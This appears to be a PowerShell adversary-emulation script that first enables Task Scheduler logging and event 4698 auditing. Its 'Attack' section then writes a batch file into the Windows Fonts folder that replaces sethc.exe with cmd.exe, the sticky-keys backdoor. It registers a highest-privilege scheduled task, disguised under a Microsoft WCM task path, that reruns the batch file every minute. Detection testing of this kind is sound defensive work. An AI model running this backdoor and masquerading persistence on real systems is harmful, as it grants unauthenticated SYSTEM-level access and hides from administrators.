<# Start Task Scheduler Logs #>
$logName = 'Microsoft-Windows-TaskScheduler/Operational'
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName
$log.IsEnabled=$true
$log.SaveChanges()

<# Enable 4698 Events in Event Viewer #>
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

<# Attack #>
echo "move c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe" >> c:\\Windows\\Fonts\\pepper.cmd

$Time = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$Action = New-ScheduledTaskAction -Execute "C:\Windows\Fonts\pepper.cmd"
Register-ScheduledTask -TaskName "Nettask" -TaskPath "\Microsoft\Windows\WCM\" -Trigger $Time -Action $Action -Runlevel Highest
Get-ScheduledTask -TaskPath "\Microsoft\Windows\WCM\" | Start-ScheduledTask